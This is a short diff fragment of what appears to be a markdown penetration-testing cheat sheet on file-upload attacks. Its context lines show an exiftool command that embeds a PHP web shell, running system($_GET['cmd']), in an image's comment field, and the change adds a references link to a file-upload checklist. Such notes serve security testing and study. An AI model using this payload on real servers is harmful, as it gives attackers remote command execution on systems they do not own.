@@ -147,3 +147,9 @@
             ```php
             exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
             ```
+            
+  
+
+
+### References:
+* https://github.com/HolyBugx/HolyTips/blob/main/Checklist/File%20Upload.md
